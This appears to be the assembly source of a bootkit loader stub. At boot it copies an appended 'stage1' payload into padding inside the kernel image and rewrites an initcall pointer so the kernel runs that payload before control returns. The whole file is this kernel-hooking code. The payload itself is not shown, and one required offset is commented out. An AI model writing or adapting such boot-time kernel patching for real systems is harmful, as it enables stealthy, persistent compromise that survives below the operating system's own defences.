BITS 64
; Several ways we can reach this code, we just keep them at fixed offsets so we
; can adjust our patches to use them.


_bios_entry:
    jmp _start

    align 32, db 0xff

_uefi_entry:
; just some instructions we patched out, doing it here to make the patch
; cleaner.
    mov rsi, rbx
    add rax, rcx



; Now onto our real start:
_start:
    push rax
    push rcx
    push rdi
    push rsi

; now we need patch the kernel and get stage1 in a suitable place.
 
; so the kernel pads sections with 0xcc, with a 0x20_00_00 alignment, so we
; have a ton of free space to place a payload.
%define _stage1_offset 0x01_30_00_00
    lea rsi, [rel stage1]
    lea rdi, [rax + _stage1_offset]
    mov rcx, stage1_len
    rep movsb


; hook initcall to call our stage1
; %define _initcall_offset 0x02_b6_ee_08
    ; (rax + _initcall_offset + value)
    ; 0xffdd6d48
    mov edi, _stage1_offset - _initcall_offset
    mov dword [rax + _initcall_offset], edi

; now we can transfer control over
    pop rsi
    pop rdi
    pop rcx
    pop rax
    jmp rax

; stage 1 will be appended
stage1:
